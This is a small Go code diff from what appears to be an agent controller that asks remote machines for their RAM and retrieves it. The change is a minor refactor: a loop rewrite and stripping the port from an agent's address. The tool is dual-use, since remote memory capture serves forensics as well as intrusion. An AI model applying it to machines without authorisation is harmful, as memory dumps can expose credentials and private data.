@@ -8,6 +8,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"strings"
 )
 
 var agentsList = []string{}
@@ -165,7 +166,7 @@ func requestRAM(port string) {
 
 		var inpt int
 
-		for true {
+		for {
 			fmt.Println("[?] Insert Index of the agent to request")
 			fmt.Print("> ")
 
@@ -174,7 +175,8 @@ func requestRAM(port string) {
 			if inpt >= 0 && inpt < len(agentsList) {
 				fmt.Println("[+] Requesting RAM.")
 				sendMessage(msg, agentsList[inpt])
-				retreiveRAM(port, agentsList[inpt])
+
+				retreiveRAM(port, strings.Split(agentsList[inpt], ":")[0])
 				break
 			} else {
 				fmt.Println("[!] Invalid agent index!")
